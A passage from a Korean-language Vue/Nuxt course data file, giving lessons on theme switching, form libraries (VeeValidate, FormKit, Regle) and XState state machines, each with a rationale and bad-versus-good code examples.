  base: 'inline-flex items-center justify-center rounded-md font-medium transition-colors focus-visible:ring-2 disabled:opacity-50 disabled:pointer-events-none',
  variants: {
    variant: { primary: 'bg-primary text-on-primary hover:bg-primary-hover', danger: 'bg-danger text-white', ghost: 'bg-transparent hover:bg-surface-2' },
    size: { sm: 'h-8 px-3 text-sm', md: 'h-10 px-4', lg: 'h-12 px-6 text-lg' },
  },
  compoundVariants: [{ variant: 'ghost', size: 'sm', class: 'px-2' }],
  defaultVariants: { variant: 'primary', size: 'md' },
})
export type ButtonProps = VariantProps<typeof button>

<!-- Button.vue -->
<script setup lang="ts">
const props = defineProps<{ variant?: ButtonProps['variant']; size?: ButtonProps['size'] }>()
</script>
<template><button :class="button({ variant, size })"><slot /></button></template>
`,
        },
        {
          id: 'l8', short: `전환`,
          title: `테마를 바꾸는 순간엔 transition 을 끄고, 서버 렌더와 첫 화면이 같게 한다`,
          why: `테마 전환 때 모든 요소의 color transition 이 제각각 돌아 얼룩처럼 보입니다. 바꾸는 동안만 전환을 끄면 한 번에 바뀝니다. 그리고 선택값은 쿠키에도 저장해야 SSR 이 같은 테마로 그려 하이드레이션 불일치가 없습니다.`,
          bad: String.raw`
* { transition: background-color .3s, color .3s; }     /* 테마 전환 때 요소마다 다른 타이밍 → 얼룩 */
localStorage.setItem('theme', 'dark')                    /* 서버는 모른다 → SSR 은 light, 클라는 dark */
`,
          good: String.raw`
// composables/useTheme.ts
export function setTheme(next: 'light' | 'dark' | 'system') {
  const root = document.documentElement
  root.classList.add('no-transitions')
  colorMode.preference = next                      // 쿠키 + 속성 (color-mode 모듈)
  requestAnimationFrame(() => requestAnimationFrame(() => root.classList.remove('no-transitions')))
}
/* main.css */
.no-transitions *, .no-transitions *::before, .no-transitions *::after { transition: none !important; }
/* View Transitions API 를 쓰면 document.startViewTransition(() => setTheme(next)) 로 부드럽게 */
`,
        },
        {
          id: 'l9', short: `대비 쌍`,
          title: `배경 토큰에는 짝이 되는 전경 토큰(on-*) 을 만들고 대비를 검사한다`,
          why: `bg-primary 위에 text-white 를 손으로 고르면 테마가 바뀔 때 대비가 깨집니다. primary 와 on-primary 를 쌍으로 정의하면 테마는 쌍을 통째로 바꾸고, 토큰 빌드 때 WCAG 4.5:1 을 검사해 실패시킬 수 있습니다(22회차).`,
          bad: String.raw`
[data-theme="dark"] { --color-primary: #93c5fd; }   /* 밝은 파랑 */
.btn-primary { background: var(--color-primary); color: #fff; }   /* 흰 글자 → 대비 1.6:1 */
`,
          good: String.raw`
:root { --color-primary: #2563eb; --color-on-primary: #ffffff; --color-surface: #fff; --color-on-surface: #111827; }
[data-theme="dark"] { --color-primary: #93c5fd; --color-on-primary: #0b1a3a; --color-surface: #0b0f19; --color-on-surface: #f3f4f6; }
.btn-primary { background: var(--color-primary); color: var(--color-on-primary); }

// scripts/check-contrast.ts (토큰 빌드 뒤) — 쌍마다 검사
import { wcagContrast } from 'culori'
for (const [bg, fg] of [['primary', 'on-primary'], ['surface', 'on-surface']])
  for (const theme of ['light', 'dark']) {
    const ratio = wcagContrast(tokens[theme][bg], tokens[theme][fg])
    if (ratio < 4.5) { console.error(theme, bg, fg, ratio.toFixed(2)); process.exitCode = 1 }
  }
`,
        },
        {
          id: 'l10', short: `다중 브랜드`,
          title: `브랜드·테넌트별 테마는 속성 하나로 고르고, 컴포넌트는 손대지 않는다`,
          why: `화이트라벨 서비스에서 브랜드마다 컴포넌트를 분기하면 끝이 없습니다. 브랜드는 의미 토큰의 매핑 집합일 뿐입니다. 서버가 호스트로 브랜드를 정해 data-brand 를 붙이면 CSS 가 나머지를 합니다. 로고·폰트도 토큰(변수) 으로 넣습니다.`,
          bad: String.raw`
<template>
  <AcmeButton v-if="brand === 'acme'" />
  <GlobexButton v-else-if="brand === 'globex'" />
  <img :src="brand === 'acme' ? '/acme.svg' : '/globex.svg'" />
</template>
`,
          good: String.raw`
// server/middleware/brand.ts — 호스트로 브랜드 결정
export default defineEventHandler((e) => {
  const host = getRequestHost(e)
  e.context.brand = host.startsWith('acme.') ? 'acme' : host.startsWith('globex.') ? 'globex' : 'default'
})
// app.vue
const brand = useState('brand', () => useRequestEvent()?.context.brand ?? 'default')
useHead({ htmlAttrs: { 'data-brand': brand } })

/* assets/css/brands.css — 브랜드는 매핑만 */
[data-brand="acme"]   { --primary: #e11d48; --font-sans: 'Acme Sans', system-ui; --logo: url(/brands/acme.svg); }
[data-brand="globex"] { --primary: #0f766e; --font-sans: 'Globex', system-ui; --logo: url(/brands/globex.svg); }
.logo { background-image: var(--logo); }      /* 컴포넌트는 그대로 */
`,
        },
      ],
    },
    {
      id: 'vue-33', no: 33, name: `폼 라이브러리 비교 (VeeValidate, FormKit, Regle)`,
      lead: `폼이 몇 개인지, 누가 디자인을 쥐는지에 따라 답이 다릅니다. 직접 만들기, VeeValidate, FormKit, Regle 의 자리를 구분하고, 어느 쪽이든 스키마 공유·검증 타이밍·서버 오류 매핑은 같은 습관으로 합니다.`,
      lessons: [
        {
          id: 'l1', short: `기준`,
          title: `폼이 두세 개면 직접, 열 개가 넘으면 라이브러리. 기준은 폼의 수와 반복이다`,
          why: `로그인·문의 두 개에 폼 라이브러리를 들이면 배우는 비용이 더 큽니다. 반대로 관리자 화면 40개를 ref 와 if 로 짜면 검증·오류·dirty 처리가 40벌이 됩니다. "같은 폼 로직을 세 번째 복사하는 순간" 이 도입 시점입니다.`,
          bad: String.raw`
// 폼 2개짜리 앱에 FormKit + 플러그인 + 테마 설정 300줄
// 또는 관리자 40개 화면이 각자 const errors = ref({}); function validate() { if (!form.name) errors.value.name = '...' }
`,
          good: String.raw`
// 폼 2~3개: zod + 작은 컴포저블 (19회차 useForm) 로 충분
const { values, errors, submit } = useZodForm(loginSchema, login)

// 선택표
// - 템플릿을 내가 쥐고 폼이 많다           → VeeValidate (Field/useField) 또는 Regle (headless, 더 작음)
// - 관리자·설문처럼 폼을 "생성" 하고 싶다   → FormKit (스키마로 폼 자체를 만든다)
// - 디자인 시스템이 이미 있다              → headless (VeeValidate useField / Regle) 가 충돌이 적다
`,
        },
        {
          id: 'l2', short: `VeeValidate`,
          title: `VeeValidate 는 useForm + toTypedSchema 로 스키마를 넘기고, 필드는 useField 로 붙인다`,
          why: `규칙 문자열('required|email') 시대의 API 는 타입이 없습니다. toTypedSchema(zod) 로 넘기면 values 타입이 추론되고 서버와 같은 스키마를 씁니다. 컴포넌트 라이브러리의 입력을 쓰려면 Field 컴포넌트보다 useField 가 자유롭습니다.`,
          bad: String.raw`
<Field name="email" rules="required|email" />      <!-- 문자열 규칙: 타입 없음, 서버와 중복 -->
<ErrorMessage name="email" />
`,
          good: String.raw`
<script setup lang="ts">
import { useForm, useField } from 'vee-validate'
import { toTypedSchema } from '@vee-validate/zod'
import { signupSchema } from '~/shared/schemas/user'       // 서버와 공유 (l5)

const { handleSubmit, isSubmitting, errors } = useForm({ validationSchema: toTypedSchema(signupSchema) })
const { value: email, errorMessage: emailError, handleBlur } = useField<string>('email')
const onSubmit = handleSubmit(async (values) => { await $fetch('/api/signup', { method: 'POST', body: values }) })
</script>
<template>
  <form @submit="onSubmit" novalidate>
    <UiInput v-model="email" type="email" label="이메일" :error="emailError" @blur="handleBlur" />
    <button :disabled="isSubmitting">가입</button>
  </form>
</template>
`,
        },
        {
          id: 'l3', short: `FormKit`,
          title: `FormKit 은 폼을 스키마로 "생성" 할 때 쓴다. 디자인을 세밀히 쥐어야 하면 비용을 계산한다`,
          why: `FormKit 은 입력·라벨·오류·레이아웃까지 한 컴포넌트가 그립니다. 관리자 CRUD 나 설문처럼 폼이 데이터로 정의되면 압도적으로 빠릅니다. 대신 디자인 시스템과 맞추려면 섹션 클래스와 테마를 길게 설정해야 합니다. 그 비용을 처음에 셉니다.`,
          bad: String.raw`
<!-- 픽셀 단위 디자인이 정해진 마케팅 폼을 FormKit 으로 → 모든 섹션 스타일 오버라이드와 싸움 -->
`,
          good: String.raw`
<!-- 관리자 화면: 필드 정의가 데이터 → 화면 40개가 설정 40개 -->
<script setup lang="ts">
const schema = [
  { $formkit: 'text', name: 'name', label: '상품명', validation: 'required|length:2,50' },
  { $formkit: 'number', name: 'price', label: '가격', validation: 'required|min:0', step: 100 },
  { $formkit: 'select', name: 'status', label: '상태', options: { draft: '임시', live: '판매중' } },
  { $formkit: 'checkbox', name: 'tags', label: '태그', options: ['신상', '세일'] },
]
</script>
<template>
  <FormKit type="form" submit-label="저장" @submit="save">
    <FormKitSchema :schema="schema" />
  </FormKit>
</template>
// 테마: formkit.config.ts 에서 generateClasses 로 Tailwind 클래스를 섹션별로 한 번 선언 (14회차 CRUD 생성 패턴과 결합)
`,
        },
        {
          id: 'l4', short: `Regle`,
          title: `Regle 은 headless 다. 템플릿은 내 것, 규칙과 상태만 받는다`,
          why: `Vuelidate 의 후속으로 타입 추론이 좋고 번들이 작습니다. 컴포넌트를 전혀 제공하지 않으므로 디자인 시스템이 있는 팀에 맞습니다. zod/valibot 스키마도 그대로 받습니다. 대신 Field 컴포넌트나 생성 기능은 없으니 폼이 아주 많으면 반복이 생깁니다.`,
          bad: String.raw`
// 디자인 시스템이 있는데 UI 가 포함된 폼 라이브러리를 골라 스타일을 전부 덮어쓴다
`,
          good: String.raw`
<script setup lang="ts">
import { useRegle } from '@regle/core'
import { required, email, minLength } from '@regle/rules'

const form = reactive({ email: '', password: '' })
const { r$ } = useRegle(form, {
  email: { required, email },
  password: { required, minLength: minLength(8) },
})
async function submit() {
  const { valid, data } = await r$.$validate()     // data 는 타입이 좁혀진 값
  if (valid) await login(data)
}
</script>
<template>
  <UiInput v-model="form.email" label="이메일" :error="r$.$fields.email.$errors[0]" @blur="r$.$fields.email.$touch()" />
  <UiInput v-model="form.password" type="password" label="비밀번호" :error="r$.$fields.password.$errors[0]" />
  <button :disabled="r$.$pending" @click="submit">로그인</button>
</template>
// zod 가 이미 있으면: import { useRegleSchema } from '@regle/schemas'; useRegleSchema(form, loginSchema)
`,
        },
        {
          id: 'l5', short: `스키마 공유`,
          title: `어느 라이브러리든 규칙의 원본은 shared/ 의 zod 스키마 하나다`,
          why: `클라이언트 규칙은 사용성, 서버 규칙은 안전을 위한 것이고 둘은 같아야 합니다. 라이브러리 고유 규칙(validation: 'required|min:0') 으로 적으면 서버가 다른 언어로 또 적습니다. zod 스키마를 server/api 와 폼이 함께 import 하고, 라이브러리는 어댑터로 받습니다.`,
          bad: String.raw`
// 폼: { $formkit: 'number', validation: 'required|min:100' }
// 서버: if (body.price < 0) throw ...   → 폼은 100 이상, 서버는 0 이상. 다르다
`,
          good: String.raw`
// shared/schemas/product.ts
export const productSchema = z.object({
  name: z.string().min(2).max(50),
  price: z.number().int().min(100),
  status: z.enum(['draft', 'live']),
})
export type ProductInput = z.infer<typeof productSchema>

// server/api/products.post.ts
const body = await readValidatedBody(event, productSchema.parse)

// VeeValidate: toTypedSchema(productSchema)
// Regle:       useRegleSchema(form, productSchema)
// FormKit:     @formkit/zod 플러그인 → createZodPlugin(productSchema, submit)
// 직접:        useZodForm(productSchema, submit)
`,
        },
        {
          id: 'l6', short: `타이밍`,
          title: `첫 검증은 blur 뒤에, 그 다음부터 입력마다. 제출 때는 전부`,
          why: `타이핑 첫 글자부터 "이메일 형식이 아닙니다" 가 뜨면 공격당하는 느낌입니다. 필드를 떠날 때 처음 검증하고, 한 번 오류가 난 필드는 고치는 즉시 사라지게 입력마다 다시 검사합니다. 제출은 전체를 검사하고 첫 오류 필드로 포커스를 옮깁니다.`,
          bad: String.raw`
<input v-model="email" @input="validateEmail" />    <!-- 첫 글자부터 빨간 오류 -->
`,
          good: String.raw`
// VeeValidate: useForm({ validateOnMount: false }) + useField(name, undefined, { validateOnValueUpdate: false }) 로 시작,
// blur 에서 handleBlur → 오류가 생긴 뒤에는 라이브러리가 입력마다 재검증 (validateOnBlur/validateOnInput 설정)
// 직접 만든다면:
const touched = reactive<Record<string, boolean>>({})
function onBlur(name: string) { touched[name] = true; validateField(name) }
watch(() => form[name], () => { if (touched[name]) validateField(name) })

async function submit() {
  const ok = await validateAll()
  if (!ok) { Object.keys(form).forEach(k => touched[k] = true); focusFirstError(); return }
}
function focusFirstError() {
  const first = document.querySelector<HTMLElement>('[aria-invalid="true"]'); first?.focus()
}
`,
        },
        {
          id: 'l7', short: `서버 오류`,
          title: `422 응답의 필드 오류는 setErrors 로 해당 필드에 붙인다. 토스트로 뭉개지 않는다`,
          why: `"이미 사용 중인 이메일" 은 서버만 압니다. 그걸 상단 토스트로 띄우면 사용자는 어느 칸인지 찾아야 합니다. 서버 오류를 { field: message } 형태로 받아 폼 라이브러리의 setErrors 에 넣으면 클라이언트 검증 오류와 똑같이 보입니다(27회차 createError 의 data 활용).`,
          bad: String.raw`
try { await $fetch('/api/signup', { method: 'POST', body }) }
catch (e) { toast.error('저장에 실패했습니다') }     // 어느 필드가 왜?
`,
          good: String.raw`
// server: throw createError({ statusCode: 422, data: { errors: { email: '이미 사용 중인 이메일입니다' } } })

// VeeValidate
const { handleSubmit, setErrors } = useForm({ validationSchema })
const onSubmit = handleSubmit(async (values) => {
  try { await $fetch('/api/signup', { method: 'POST', body: values }) }
  catch (e: any) {
    if (e.statusCode === 422 && e.data?.errors) { setErrors(e.data.errors); focusFirstError(); return }
    throw e                                        // 나머지는 전역 처리 (27회차)
  }
})
// Regle: r$.$fields.email.$externalErrors 또는 useRegle 의 externalErrors 옵션에 서버 오류를 넣는다
// zod 파싱 오류를 서버가 돌려줄 때: error.flatten().fieldErrors → 같은 모양으로 변환
`,
        },
        {
          id: 'l8', short: `배열 필드`,
          title: `동적 필드 목록은 useFieldArray 로 다루고 키는 인덱스가 아니라 고유 id 다`,
          why: `옵션 추가·삭제가 있는 폼에서 v-for 키를 인덱스로 주면 중간 삭제 때 입력값과 오류가 밀립니다. 라이브러리의 필드 배열 API 는 항목마다 key 를 만들어 주고 push/remove/move 때 검증 상태도 같이 옮깁니다.`,
          bad: String.raw`
<div v-for="(opt, i) in form.options" :key="i">          <!-- 인덱스 키 -->
  <input v-model="opt.label" />
  <button @click="form.options.splice(i, 1)">삭제</button>  <!-- 오류 상태가 다음 항목으로 밀림 -->
</div>
`,
          good: String.raw`
<script setup lang="ts">
import { useFieldArray } from 'vee-validate'
const { fields, push, remove, move } = useFieldArray<{ label: string; price: number }>('options')
</script>
<template>
  <div v-for="(f, i) in fields" :key="f.key">            <!-- 라이브러리가 준 고유 key -->
    <UiInput v-model="f.value.label" :label="'옵션 ' + (i + 1)" />
    <button type="button" @click="remove(i)">삭제</button>
  </div>
  <button type="button" @click="push({ label: '', price: 0 })">옵션 추가</button>
</template>
// 스키마: options: z.array(optionSchema).min(1, '옵션을 하나 이상 넣어 주세요').max(20)
`,
        },
        {
          id: 'l9', short: `비동기 검증`,
          title: `아이디 중복 같은 서버 검증은 디바운스·취소·캐시를 갖춘 규칙으로 만든다`,
          why: `입력마다 서버에 물으면 요청이 쏟아지고, 응답 순서가 뒤집히면 "사용 가능" 이 잘못 뜹니다. 400ms 디바운스, 이전 요청 취소(AbortController), 같은 값 캐시 세 가지를 갖춘 비동기 규칙 하나를 만들어 어느 폼에서나 씁니다.`,
          bad: String.raw`
watch(username, async (v) => { available.value = (await $fetch('/api/check?u=' + v)).ok })   // 폭주 + 순서 역전
`,
          good: String.raw`
// composables/useAsyncRule.ts
export function useAsyncRule(check: (v: string, signal: AbortSignal) => Promise<boolean>, message: string, wait = 400) {
  const cache = new Map<string, boolean>(); let ctrl: AbortController | null = null; let timer: any
  return (value: string) => new Promise<true | string>((resolve) => {
    if (!value) return resolve(true)
    if (cache.has(value)) return resolve(cache.get(value) ? true : message)
    clearTimeout(timer); ctrl?.abort(); ctrl = new AbortController()
    const signal = ctrl.signal
    timer = setTimeout(async () => {
      try { const ok = await check(value, signal); cache.set(value, ok); resolve(ok ? true : message) }
      catch (e: any) { if (e.name !== 'AbortError') resolve(true) }   // 네트워크 오류는 서버 제출에서 걸리게 통과
    }, wait)
  })
}
const usernameFree = useAsyncRule((u, signal) => $fetch('/api/users/check', { query: { u }, signal }).then(r => r.available), '이미 사용 중인 아이디입니다')
// VeeValidate: zod 스키마에 .refine(usernameFree) 대신 useField 의 rules 로, Regle: withAsync(usernameFree)
`,
        },
        {
          id: 'l10', short: `상태 UX`,
          title: `dirty 면 떠날 때 묻고, 제출 중엔 잠그고, 성공하면 새 값으로 reset 한다`,
          why: `세 가지가 빠진 폼이 가장 많습니다. 작성 중 뒤로 가기로 날리고, 더블 클릭으로 두 번 저장되고, 저장 뒤에도 "변경 사항 있음" 이 남습니다. 라이브러리는 meta.dirty, isSubmitting, resetForm 을 주므로 연결만 하면 됩니다.`,
          bad: String.raw`
<button @click="save">저장</button>          <!-- 더블 클릭 2회 저장 -->
// 저장 후 아무것도 안 함 → 폼은 여전히 dirty, 떠날 때 "저장하지 않은 변경" 경고
`,
          good: String.raw`
const { handleSubmit, isSubmitting, meta, resetForm } = useForm({ validationSchema, initialValues: props.product })

onBeforeRouteLeave(() => {
  if (meta.value.dirty && !confirm('저장하지 않은 변경이 있습니다. 나갈까요?')) return false
})
useEventListener(window, 'beforeunload', (e) => { if (meta.value.dirty) e.preventDefault() })

const onSubmit = handleSubmit(async (values) => {
  const saved = await $fetch('/api/products/' + values.id, { method: 'PUT', body: values })
  resetForm({ values: saved })        // 서버가 돌려준 값이 새 initial → dirty=false
  toast.success('저장했습니다')
})
<button type="submit" :disabled="isSubmitting || !meta.dirty">{{ isSubmitting ? '저장 중…' : '저장' }}</button>
`,
        },
      ],
    },
    {
      id: 'vue-34', no: 34, name: `상태 머신 (XState) 과 복잡한 UI 흐름`,
      lead: `isLoading, isError, isRetrying 같은 불리언이 셋을 넘으면 "있을 수 없는 조합" 이 생깁니다. 상태를 이름 붙은 하나의 값으로 만들고, 전이를 표로 적고, 부작용을 흐름에서 떼어 내는 습관입니다. 라이브러리 없이 시작해 필요할 때 XState 로 갑니다.`,
      lessons: [
        {
          id: 'l1', short: `신호`,
          title: `불리언 플래그가 셋 이상이면 상태 머신을 의심한다`,
          why: `isLoading && isError 처럼 동시에 참일 수 없는 조합을 코드가 막지 못합니다. 버그는 늘 그 조합에서 납니다. 상태를 'idle' | 'loading' | 'error' | 'success' 하나로 만들면 불가능한 조합이 타입에서 사라집니다.`,
          bad: String.raw`
const isLoading = ref(false), isError = ref(false), isSuccess = ref(false), isRetrying = ref(false)
// 2^4 = 16 조합 중 유효한 건 4개. 나머지 12개를 if 로 막는다 (못 막는다)
if (isLoading.value && !isError.value && !isRetrying.value) ...
`,
          good: String.raw`
type State =
  | { status: 'idle' }
  | { status: 'loading'; attempt: number }
  | { status: 'error'; message: string; attempt: number }
  | { status: 'success'; data: Order }
const state = ref<State>({ status: 'idle' })
// 템플릿: v-if="state.status === 'loading'" — 조합은 4개뿐, 데이터는 그 상태에만 존재
`,
        },
        {
          id: 'l2', short: `라이브러리 전`,
          title: `먼저 union 타입과 전이 함수로 쓴다. 전이표가 커지면 그때 XState`,
          why: `상태 머신은 사고방식이지 패키지가 아닙니다. 상태 5개·이벤트 6개까지는 reducer 하나로 충분하고 의존성도 없습니다. 전이가 20개를 넘거나, 병렬·중첩 상태가 필요하거나, 그림으로 공유해야 할 때 XState 가 값을 합니다.`,
          bad: String.raw`
// 상태 3개짜리 토글에 XState + inspector + 액터 시스템 도입
`,
          good: String.raw`
type Event = { type: 'FETCH' } | { type: 'RESOLVE'; data: Order } | { type: 'REJECT'; message: string } | { type: 'RETRY' }
function transition(s: State, e: Event): State {
  switch (s.status) {
    case 'idle':    return e.type === 'FETCH' ? { status: 'loading', attempt: 1 } : s
    case 'loading': return e.type === 'RESOLVE' ? { status: 'success', data: e.data }
                         : e.type === 'REJECT' ? { status: 'error', message: e.message, attempt: s.attempt } : s
    case 'error':   return e.type === 'RETRY' && s.attempt < 3 ? { status: 'loading', attempt: s.attempt + 1 } : s
    case 'success': return e.type === 'FETCH' ? { status: 'loading', attempt: 1 } : s
  }
}
const state = ref<State>({ status: 'idle' })
const send = (e: Event) => { state.value = transition(state.value, e) }
// 테스트: expect(transition({ status: 'error', attempt: 3, message: '' }, { type: 'RETRY' }).status).toBe('error')
`,
        },
        {
          id: 'l3', short: `XState v5`,
          title: `XState 는 setup() 으로 타입을 먼저 선언하고, 컴포넌트는 useMachine 으로 붙인다`,
          why: `v5 는 setup({ types, actions, guards, actors }) 에 모든 것을 선언하고 createMachine 은 전이만 적습니다. 이렇게 해야 이벤트·컨텍스트 타입이 추론되고, 액션 이름 오타가 컴파일 오류가 됩니다. @xstate/vue 의 useMachine 이 snapshot 과 send 를 반응형으로 줍니다.`,
          bad: String.raw`
const machine = createMachine({ /* 타입 없이 */ states: { idle: { on: { FETCH: 'loding' } } } })   // 오타가 런타임까지 감
`,
          good: String.raw`
// machines/order.ts
import { setup, assign, fromPromise } from 'xstate'
export const orderMachine = setup({
  types: { context: {} as { order: Order | null; attempt: number; error: string | null }, events: {} as { type: 'FETCH'; id: string } | { type: 'RETRY' } },
  actors: { loadOrder: fromPromise(({ input }: { input: { id: string } }) => $fetch<Order>('/api/orders/' + input.id)) },
  guards: { canRetry: ({ context }) => context.attempt < 3 },
}).createMachine({
  id: 'order', initial: 'idle',
  context: { order: null, attempt: 0, error: null },
  states: {
    idle: { on: { FETCH: { target: 'loading', actions: assign({ attempt: 1 }) } } },
    loading: { invoke: { src: 'loadOrder', input: ({ event }) => ({ id: (event as any).id }),
      onDone: { target: 'success', actions: assign({ order: ({ event }) => event.output }) },
      onError: { target: 'error', actions: assign({ error: ({ event }) => String(event.error) }) } } },
    error: { on: { RETRY: { guard: 'canRetry', target: 'loading', actions: assign({ attempt: ({ context }) => context.attempt + 1 }) } } },
    success: { type: 'final' },
  },
})

// 컴포넌트
import { useMachine } from '@xstate/vue'
const { snapshot, send } = useMachine(orderMachine)
// snapshot.value.matches('loading'), snapshot.value.context.order, send({ type: 'FETCH', id })
`,
        },
        {
          id: 'l4', short: `이벤트 이름`,
          title: `이벤트는 사용자의 의도(SUBMIT) 로 이름 짓고, 조건은 guard 로 뺀다`,
          why: `BUTTON_CLICKED 는 어떤 버튼인지, 그래서 뭘 하려는지 말하지 않습니다. 이벤트를 의도로 적으면 머신이 곧 요구사항 문서가 됩니다. "재고가 있을 때만 결제로" 같은 조건은 컴포넌트의 if 가 아니라 guard 에 두어 흐름 전체가 한 파일에 보이게 합니다.`,
          bad: String.raw`
// 컴포넌트
function onClick() { if (stock.value > 0 && !submitting.value && agreed.value) send({ type: 'BUTTON_CLICKED' }) }
`,
          good: String.raw`
// 컴포넌트: 의도만 보낸다
<button @click="send({ type: 'PAY' })">결제</button>

// 머신: 조건은 guard, 이름은 의도
states: {
  review: { on: {
    PAY: [
      { guard: 'inStock', target: 'paying' },
      { target: 'outOfStock' },                 // 첫 guard 가 거짓이면 다음 전이
    ],
    EDIT_ADDRESS: 'address',
  } },
}
guards: { inStock: ({ context }) => context.items.every(i => i.stock > 0) }
`,
        },
        {
          id: 'l5', short: `부작용`,
          title: `fetch, 타이머, 저장은 actor 와 action 으로. 컴포넌트는 send 만 한다`,
          why: `상태는 머신이 들고 fetch 는 컴포넌트가 하면 "loading 인데 요청이 없다", "언마운트됐는데 응답이 온다" 가 생깁니다. 비동기 작업을 머신의 invoke 로 두면 상태를 떠날 때 자동으로 취소되고, 결과는 onDone/onError 전이로 들어옵니다.`,
          bad: String.raw`
send({ type: 'FETCH' })
const data = await $fetch('/api/order')          // 머신과 따로 노는 요청
send({ type: 'RESOLVE', data })                  // 그 사이 사용자가 취소했다면?
`,
          good: String.raw`
// 타이머도 actor: 10초 후 자동 닫힘
import { fromCallback } from 'xstate'
actors: {
  autoClose: fromCallback(({ sendBack }) => { const t = setTimeout(() => sendBack({ type: 'TIMEOUT' }), 10_000); return () => clearTimeout(t) }),
}
states: {
  open: { invoke: { src: 'autoClose' }, on: { TIMEOUT: 'closed', CLOSE: 'closed' } },   // 상태를 떠나면 타이머 정리
  closed: {},
}
// 저장 같은 동기 부작용은 action 으로: actions: { persist: ({ context }) => sessionStorage.setItem('draft', JSON.stringify(context.form)) }
`,
        },
        {
          id: 'l6', short: `컨텍스트`,
          title: `컨텍스트에는 흐름에 필요한 것만. 서버 데이터는 id 로 가리키고 캐시에 둔다`,
          why: `주문 목록 전체를 머신 컨텍스트에 복사하면 Pinia·useFetch 캐시와 두 벌이 되고 어느 쪽이 진실인지 모릅니다. 머신은 "어디까지 왔는가" 를, 데이터 계층은 "무엇인가" 를 맡깁니다. 컨텍스트에는 선택한 id, 시도 횟수, 입력값처럼 흐름 자체의 데이터만 둡니다.`,
          bad: String.raw`
context: { orders: Order[]; products: Product[]; user: User; cart: Cart; ... }   // 스토어 복제
`,
          good: String.raw`
context: { selectedOrderId: string | null; step: 1 | 2 | 3; attempt: number; shippingForm: ShippingInput | null }
// 데이터는 바깥에서
const { data: order } = useFetch(() => '/api/orders/' + snapshot.value.context.selectedOrderId, { immediate: false })
// 머신이 바깥 데이터를 봐야 하면 input 으로 넘긴다: useMachine(machine, { input: { userId } })
`,
        },
        {
          id: 'l7', short: `분리`,
          title: `머신은 .ts 모듈로 두고 컴포넌트 없이 테스트한다`,
          why: `머신이 컴포넌트 안에 있으면 테스트에 마운트와 DOM 이 필요합니다. 모듈로 빼면 createActor 로 돌리고 send 한 뒤 snapshot 을 검사하면 끝입니다. 흐름 버그의 대부분이 여기서 잡히고, 컴포넌트 테스트는 "상태를 그렇게 그리는가" 만 보면 됩니다.`,
          bad: String.raw`
// 컴포넌트 안에 createMachine 300줄 + 템플릿 → 테스트하려면 전부 마운트
`,
          good: String.raw`
// machines/checkout.test.ts
import { createActor } from 'xstate'
import { checkoutMachine } from './checkout'

it('재고가 없으면 결제로 못 간다', () => {
  const actor = createActor(checkoutMachine, { input: { items: [{ id: 'a', stock: 0 }] } }).start()
  actor.send({ type: 'PAY' })
  expect(actor.getSnapshot().matches('outOfStock')).toBe(true)
})
it('3번 실패하면 재시도 불가', () => {
  const actor = createActor(checkoutMachine.provide({ actors: { pay: fromPromise(async () => { throw new Error('x') }) } })).start()
  ...
})
// 컴포넌트 테스트는 snapshot 을 주입해 "error 상태면 재시도 버튼이 보이는가" 만
`,
        },
        {
          id: 'l8', short: `위자드`,
          title: `다단계 폼은 단계가 상태, 뒤로 가기는 전이, 단계 통과 조건은 guard 다`,
          why: `step 숫자와 if 로 만든 위자드는 "2단계를 건너뛰고 3단계" 같은 비정상 경로를 못 막고, 브라우저 뒤로 가기와 어긋납니다. 단계를 상태로 두고 NEXT/BACK 만 허용하면 경로가 통제되고, 라우트 쿼리와 동기화하면 뒤로 가기도 맞습니다.`,
          bad: String.raw`
const step = ref(1)
function next() { if (step.value === 1 && validShipping()) step.value = 2; else if (step.value === 2 && validPayment()) step.value = 3 }
// URL 은 항상 /checkout → 뒤로 가기는 장바구니로 튐
`,
          good: String.raw`
states: {
  shipping: { on: { NEXT: { guard: 'shippingValid', target: 'payment' } } },
  payment:  { on: { NEXT: { guard: 'paymentValid', target: 'review' }, BACK: 'shipping' } },
  review:   { on: { CONFIRM: 'submitting', BACK: 'payment' } },
  submitting: { invoke: { src: 'placeOrder', onDone: 'done', onError: 'review' } },
  done: { type: 'final' },
}
// 상태 ↔ URL
const route = useRoute(), router = useRouter()
watch(() => snapshot.value.value, (s) => router.replace({ query: { step: String(s) } }))
onMounted(() => { const s = route.query.step; if (s === 'payment' || s === 'review') send({ type: 'RESTORE', step: s }) })
`,
        },
        {
          id: 'l9', short: `복구`,
          title: `긴 흐름은 스냅샷을 저장하고 새로고침 뒤 복구한다`,
          why: `결제 5단계 중 4단계에서 새로고침하면 처음으로 돌아가는 서비스는 이탈을 만듭니다. XState 스냅샷은 직렬화되므로 sessionStorage 에 넣고 createActor 의 snapshot 옵션으로 복구합니다. 민감 정보(카드 번호) 는 컨텍스트에 넣지 않습니다.`,
          bad: String.raw`
// 새로고침 → 머신 initial → 1단계. 입력 전부 소실
`,
          good: String.raw`
const KEY = 'checkout:' + cartId
const saved = sessionStorage.getItem(KEY)
const { snapshot, send, actorRef } = useMachine(checkoutMachine, {
  snapshot: saved ? JSON.parse(saved) : undefined,
})
actorRef.subscribe((snap) => {
  if (snap.status === 'done') sessionStorage.removeItem(KEY)
  else sessionStorage.setItem(KEY, JSON.stringify(actorRef.getPersistedSnapshot()))
})
// 컨텍스트 규칙: 카드 번호·비밀번호 없음. 복구 시 서버 상태와 어긋날 수 있는 값(재고) 은 복구 직후 다시 확인(VERIFY 이벤트)
`,
        },
        {
          id: 'l10', short: `그림`,
          title: `머신이 곧 스펙이다. 그림으로 공유하고, 중첩은 두 단계까지만`,
          why: `상태 머신의 가장 큰 가치는 기획·디자인과 같은 그림을 보는 것입니다. Stately 편집기나 inspector 로 시각화해 리뷰에 붙입니다. 반대로 중첩·병렬 상태를 남용하면 그림이 읽히지 않습니다. 세 단계 이상 중첩되면 하위 머신으로 나눕니다.`,
          bad: String.raw`
states: { app: { states: { checkout: { states: { payment: { states: { card: { states: { input: { states: { ... } } } } } } } } } } }   // 5단계 중첩
`,
          good: String.raw`
// 개발 중 시각화 (브라우저 inspector)
import { createBrowserInspector } from '@statelyai/inspect'
const { inspect } = import.meta.dev ? createBrowserInspector() : { inspect: undefined }
useMachine(checkoutMachine, { inspect })

// 큰 흐름은 하위 머신으로: payment 는 자식 액터
states: {
  payment: { invoke: { id: 'payment', src: paymentMachine, input: ({ context }) => ({ amount: context.total }),
    onDone: 'review' } },
}
// PR 설명에 Stately 링크 또는 inspector 스크린샷. 전이표가 바뀌면 그림도 바뀐다 → 리뷰어가 코드 대신 그림을 본다
`,
        },
      ],
    },
    {
